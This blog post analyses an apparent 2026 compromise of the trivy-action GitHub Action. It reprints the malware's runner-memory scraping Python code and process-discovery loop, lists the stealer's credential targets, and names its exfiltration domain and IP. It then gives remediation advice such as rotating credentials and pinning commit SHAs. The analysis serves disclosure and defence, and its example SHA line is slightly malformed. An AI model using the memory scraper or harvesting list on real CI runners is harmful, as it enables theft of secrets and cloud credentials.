+++
title = "Trivy GitHub Actions Compromised: Full Malware Payload Analysis"
date = "2026-03-20T15:28:00+04:00"
cover = "/blog/trivy-github-actions-compromised-full-payload-analysis/images/cover.png"
images = [
    "/blog/trivy-github-actions-compromised-full-payload-analysis/images/cover.png"
]
tags = ["Security", "GitHub Actions", "Supply Chain", "CI/CD", "DevOps"]
keywords = [
    "Trivy GitHub Actions compromise",
    "trivy-action supply chain attack",
    "GitHub Actions security",
    "CI/CD supply chain compromise",
    "Trivy malware analysis",
    "GitHub Actions version tag attack",
    "aquasecurity trivy compromise",
    "TeamPCP Cloud stealer",
    "GitHub Actions commit SHA pinning",
    "CI/CD credential theft"
]
description = "On March 19, 2026, the Trivy vulnerability scanner was compromised for the second time in three weeks. Attackers force-pushed 75 out of 76 version tags in aquasecurity/trivy-action to deliver an infostealer that scrapes runner memory, harvests cloud credentials, and exfiltrates everything via encrypted channels. Here's my full analysis of the malware payload and what you need to do if your workflows were affected."
showFullContent = false
readingTime = true
+++

On March 19, 2026, the Trivy vulnerability scanner got owned. Again. Less than three weeks after the [hackerbot-claw incident on February 28](https://github.com/aquasecurity/trivy/discussions/10420), attackers came back with a much more aggressive payload. This time they force-pushed 75 out of 76 version tags in [`aquasecurity/trivy-action`](https://github.com/aquasecurity/trivy-action) — the official GitHub Action with over 10,000 workflow references — to point at commits containing a full credential stealer.

Malicious `v0.69.4` and `v0.70.0` releases were published. The only tag that wasn't affected during the attack was `@0.35.0`. Maintainers have since removed all compromised tags and re-tagged clean releases with a `v` prefix (e.g., `v0.35.0` instead of `0.35.0`), keeping the original `0.35.0` intact.

The original incident disclosure discussion (#10265) was deleted, and spam bots flooded the new discussion thread. Homebrew [emergency-downgraded](https://github.com/Homebrew/homebrew-core/pull/273304) to `v0.69.3`.

I spent some time pulling apart the malicious payload, and the results are worth documenting. This thing goes deep.

## How Tags Were Weaponized

If you've used GitHub Actions, you've probably written something like this:

```yaml
- uses: aquasecurity/trivy-action@0.28.0
```

That `@0.28.0` is a git tag. Tags in git are **mutable references**, they can be moved to point at a different commit at any time. This is fundamentally different from pinning to a commit SHA, which is immutable.

The attack exploited exactly this. The attacker force-pushed version tags so they pointed to a fork commit containing a malicious `entrypoint.sh`. When your workflow ran `trivy-action@0.28.0` (or any of the other 74 compromised tags), GitHub pulled the code from the new commit the tag pointed to, not the original release.

The clever part: the malware runs **before** the legitimate Trivy scan. Your scan output looks completely normal. You'd never notice anything from the logs alone.

This is a known GitHub Actions attack vector. Tags are mutable. If you're not pinning to commit SHAs, you're trusting every maintainer (and anyone who compromises their account) to never move a tag. That's a lot of trust.

## Full Payload Analysis

Let's walk through what the malicious `entrypoint.sh` actually does, step by step.

### Step 1: Process Discovery

First, the script finds all GitHub Actions runner processes:

```bash
for _name in Runner.Worker Runner.Listener runsvc run.sh; do
  _PIDS=$(pgrep -f "$_name" 2>/dev/null || true)
  [ -n "$_PIDS" ] && _COLLECT_PIDS="$_COLLECT_PIDS $_PIDS"
done
```

It's looking for `Runner.Worker`, `Runner.Listener`, `runsvc`, and `run.sh` — the core processes that make up the Actions runner. These PIDs become targets for the next stage.

### Step 2: Environment Variable Harvesting

For each discovered PID, the script reads `/proc/<PID>/environ` and extracts variables containing `env` or `ssh` in their names. If a variable's value happens to be a file path that exists on disk, the script dumps that file too. This is how it catches SSH keys that are referenced by path in environment variables, not just the variable values themselves, but the actual key files.

### Step 3: Platform-Dependent Deep Extraction

This is where it gets interesting. The script checks `$RUNNER_ENVIRONMENT` and branches into two completely different payloads depending on whether you're running GitHub-hosted or self-hosted runners.

#### GitHub-Hosted Runners: Memory Scraping

For GitHub-hosted runners, the script decodes and executes a base64-encoded Python script that performs raw process memory scraping:

```python
import sys
import os
import re

def get_pid():
    for pid in (p for p in os.listdir('/proc') if p.isdigit()):
        try:
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:
                if b'Runner.Worker' in f.read():
                    return pid
        except OSError:
            continue
    raise SystemExit(0)

pid = get_pid()
map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"

with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
    for line in map_f:
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
        if not m or m.group(3) != 'r':
            continue
        start = int(m.group(1), 16)
        end = int(m.group(2), 16)
        if start > sys.maxsize:
            continue
        mem_f.seek(start)
        try:
            chunk = mem_f.read(end - start)
            sys.stdout.buffer.write(chunk)
        except OSError:
            continue
```

Here's what this does:

1. Finds the `Runner.Worker` PID by scanning `/proc`
2. Reads `/proc/<PID>/maps` to get the memory layout, specifically, which regions are readable
3. Reads raw bytes from `/proc/<PID>/mem` for each readable region
4. The output is then grepped for JSON patterns matching `"isSecret":true`

This **bypasses GitHub's secret masking**. GitHub masks secrets in log output, but the actual secret values exist as plaintext in process memory. By reading the runner's memory directly, the attacker gets every secret your workflow has access to: tokens, API keys, credentials, everything, regardless of whether they're masked in logs.

#### Self-Hosted Runners: Full Credential Stealer

For self-hosted runners, the payload is significantly larger. It's another base64-encoded Python script, and the source code literally ends with the comment `## TeamPCP Cloud stealer`. This one is a systematic credential harvester that covers 17 categories:

1. **System recon** - `hostname`, `whoami`, `uname`, `ip addr`, `printenv`
2. **SSH keys** - `id_rsa`, `id_ed25519`, `id_ecdsa`, `authorized_keys`, `known_hosts`, host keys
3. **Git credentials** - `.git-credentials`, `.gitconfig`
4. **AWS credentials** - `~/.aws/credentials`, IMDS metadata endpoint (`169.254.169.254`), ECS container credentials
5. **`.env` files** - scans the entire filesystem up to 6 levels deep for `.env`, `.env.local`, `.env.production`, and variants
6. **Kubernetes secrets** - kubeconfig, service account tokens, runs `kubectl get secrets --all-namespaces -o json`
7. **GCP credentials** - `application_default_credentials.json`, gcloud configs
8. **Azure credentials** - the entire `~/.azure/` directory
9. **Docker registry auth** - `~/.docker/config.json`, kaniko config
10. **Package/service tokens** - `.npmrc`, `.vault-token`, `.netrc`, `.pgpass`, `.my.cnf`
11. **Shell histories** - bash, zsh, mysql, psql, redis-cli
12. **Database configs** - PostgreSQL, MySQL, Redis, LDAP
13. **Infrastructure-as-Code** - Terraform `.tfvars` and `.tfstate`, Helm, Jenkinsfile, GitLab CI, etc.
14. **TLS/SSL private keys** - `.pem`, `.key`, `.p12`, `.pfx` across the filesystem
15. **Webhook URLs** - Slack, Discord
16. **Cryptocurrency wallets** - Bitcoin `wallet.dat`, Ethereum keystores, Solana validator keypairs, Cardano keys, and more
17. **System files** - `/etc/passwd`, `/etc/shadow`, auth logs

If your self-hosted runner was affected, the attacker potentially has **everything**. Every credential, every key, every secret on that machine.

## Encryption and Exfiltration

The stolen data doesn't leave the runner in plaintext. The exfiltration chain is well-engineered:

1. A random AES-256-CBC session key is generated with `openssl rand 32`
2. All collected data is encrypted with this session key
3. The session key itself is encrypted with a hardcoded RSA-4096 public key, only the attacker holds the private key, so only they can decrypt
4. Everything is bundled into `tpcp.tar.gz`

**Primary exfiltration**: HTTP POST to `scan[.]aquasecurtiy[.]org`. Notice the typosquat, that's `securtiy`, not `security`. This domain mimics Aqua Security's brand and resolves to `45.148.10.212`.

**Fallback exfiltration**: If the HTTP POST fails AND a GitHub PAT is available via `$INPUT_GITHUB_PAT`, the script creates a **public** repository called `tpcp-docs` on the victim's GitHub account and uploads the encrypted bundle as a release asset. Your stolen credentials, hosted on your own GitHub account.

**Cleanup**: All temp files are removed. No forensic artifacts left behind.

## What You Need To Do

If your workflows ran during the attack window (March 19, approximately 17:43 UTC onward), treat this as a full credential compromise:

1. **Rotate ALL credentials** your workflows had access to: GitHub tokens, cloud provider keys, Kubernetes service account tokens, SSH keys, Docker registry credentials, database passwords, API keys. All of them.

2. **Audit workflow runs** from March 19 for unexpected outbound connections, particularly to `scan[.]aquasecurtiy[.]org` or `45.148.10.212`.

3. **Pin GitHub Actions to commit SHAs**, not version tags. This is exactly how this attack worked. Instead of:
    ```yaml
    - uses: aquasecurity/trivy-action@0.28.0
    ```
    Use:
    ```yaml
    - uses: aquasecurity/trivy-action@a]b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9  # v0.28.0
    ```

4. **Check for a `tpcp-docs` repo** on your GitHub account, this is the fallback exfiltration channel.

5. **Review self-hosted runners** for signs of compromise. Given the breadth of what the self-hosted payload collects, consider these machines fully compromised and rebuild them.

6. **Update trivy-action references** to use the new `v`-prefixed tags (e.g., `v0.35.0` instead of `0.35.0`).

## Conclusion

A vulnerability scanner becoming the attack vector is deeply ironic, but it's also a wake-up call. This is the second compromise of the same tool in three weeks. Supply chain security in GitHub Actions is not a theoretical problem, it's an active, ongoing threat.

Mutable version tags are a systemic risk. Every GitHub Action you reference by tag is a trust relationship that can be violated by a single compromised account. Pin to commit SHAs. Audit your workflows. Don't assume the tools that check your security are themselves secure.
